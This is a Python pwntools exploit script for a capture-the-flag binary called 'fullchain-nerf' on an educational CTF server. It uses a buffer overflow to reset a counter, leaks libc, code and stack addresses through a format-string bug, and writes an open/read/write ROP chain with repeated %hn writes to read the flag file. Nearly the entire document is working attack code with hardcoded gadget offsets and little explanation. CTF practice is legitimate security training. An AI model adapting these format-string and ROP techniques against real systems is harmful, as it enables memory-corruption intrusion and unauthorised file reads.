from pwn import *
# r = process('./share/fullchain-nerf')
r = remote('edu-ctf.zoolab.org', 30206)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# 0. replace cnt with a large number
replace_cnt_payload = b'A'* 0x20 + b'A' * 8 # 
r.sendlineafter("global or local > ", b"local")
r.sendlineafter("set, read or write > ", b"read")
r.sendlineafter("length > ", b"96")
r.sendline(replace_cnt_payload)


# %1$p %2$p %3$p %4$p %5$p %6$p
# %6$p = rsp
# target: rsp + (104 / 8 = 13)
# %(6+13)$p
# 1. leak "libc_start_main + 243(0xf3)" address, code_base address, and stack base address (rsp+2 = rbp of chal)
fmt_payload = b"%19$p %23$p %8$p"

r.sendlineafter("global or local > ", b"global")
r.sendlineafter("set, read or write > ", b"read")
r.sendlineafter("length > ", b"96")
r.sendline(fmt_payload)

r.sendlineafter("global or local > ", b"global")
r.sendlineafter("set, read or write > ", b"write")

resp = r.recvline().decode()
print("resp: ", resp)
recv = resp.split()

libc_addr_243 = int(recv[0], 16)
main_addr = int(recv[1], 16)
stack_addr = int(recv[2], 16)


libc_start_main_offset = 0x26fc0
libc_base = libc_addr_243 - 243 - libc_start_main_offset

main_offset = 0x15fd
code_base = main_addr - main_offset

old_rbp = stack_addr+0x08 

print("libc: ", hex(libc_base))
print("main: ", hex(code_base))
print("old_rbp: ", hex(old_rbp))

# Strat rop chain
# 2. write rop chain to global
global_addr = code_base + 0x40a0
leave_ret = 0x000000000005aa48 + libc_base

pop_rdi_ret = 0x0000000000026b72 + libc_base
pop_rsi_ret = 0x0000000000027529 + libc_base
pop_rdx_rbx_ret = 0x0000000000162866 + libc_base
pop_rax_ret = 0x000000000004a550 + libc_base
syscall_ret = 0x0000000000066229 + libc_base

open_syscode = 0x02 # open
read_syscode = 0x00 # read
write_syscode = 0x01 # write
print("syscall: ", syscall_ret)
rop_payload = [
    pop_rdi_ret, global_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, open_syscode,
    syscall_ret,
    pop_rdi_ret, 3, # guess fd = 3
    pop_rsi_ret, global_addr, # read to fn
    pop_rdx_rbx_ret, 0x30, 0x0, # len
    pop_rax_ret, read_syscode,
    syscall_ret,
    pop_rdi_ret, 1, # write to stdout
    pop_rsi_ret, global_addr, # from fn
    pop_rdx_rbx_ret, 0x30, 0x0,
    pop_rax_ret, write_syscode,
    syscall_ret
]

def convert(addr):
    # convert an 8 byte address to two 4 byte
    def deal(a):
        # a = a[2:] + a[:2]
        return int(a, 16)
    res = hex(addr)[2:]
    # pad zero
    while len(res) < 16:
        res = '0' + res
    res1, res2, res3, res4 = res[:4], res[4:8], res[8:12], res[12:]

    return deal(res4), deal(res3), deal(res2), deal(res1)

def write_payload():
    idx = 0
    offset = 0x0

    while idx < len(rop_payload):
        # 1. write address to local(0x08~0x28) 包含cnt
        write_addrs = flat(
            old_rbp + offset       , old_rbp + offset + 0x02,
            old_rbp + offset + 0x04, old_rbp + offset + 0x06 + 0x800000000
        )
        # write 2 commands (0x08+0x08=0x10)
        # 0x7ffc3ade6cc0
        offset += 0x08
        r.sendlineafter("global or local > ", b"local")
        r.sendlineafter("set, read or write > ", b"read")
        r.sendlineafter("length > ", b"96")
        r.sendline(b'A'*8 + write_addrs)
        
        # 2. use fmt to write payload to address
        num = 11
        # convert to num
        cmds = convert(rop_payload[idx])
        print("Write 1:", hex(rop_payload[idx]))
        idx += 1

        # fmt_payload = f"%{cmd_11}c%{num}$hn %{cmd_12}c%{num+1}$hn %{cmt_13}c%{num+2}$hn %{cmt_14}c%{num+3}$hn"
        for i in range(4):
            
            fmt_payload = f"%{num+i}$hn\0"

            if cmds[i] != 0:
                fmt_payload = f"%{cmds[i]}c%{num + i}$hn\0"

            r.sendlineafter("global or local > ", b"global")
            r.sendlineafter("set, read or write > ", b"read")
            r.sendlineafter("length > ", b"96")
            r.sendline(fmt_payload.encode())

            r.sendlineafter("global or local > ", b"global")
            r.sendlineafter("set, read or write > ", b"write")
        # break

write_payload()

# 4. Write filename to global

file_payload = b"/home/fullchain-nerf/flag"
print("Write filename in global")
r.sendlineafter("global or local > ", b"global")
r.sendlineafter("set, read or write > ", b"read")
r.sendlineafter("length > ", b"96")
r.send(file_payload)

# change cnt
replace_cnt_payload = b'A'* 0x20 + p64(0) # 
r.sendlineafter("global or local > ", b"local")
r.sendlineafter("set, read or write > ", b"read")
r.sendlineafter("length > ", b"96")

r.sendline(replace_cnt_payload)

r.interactive()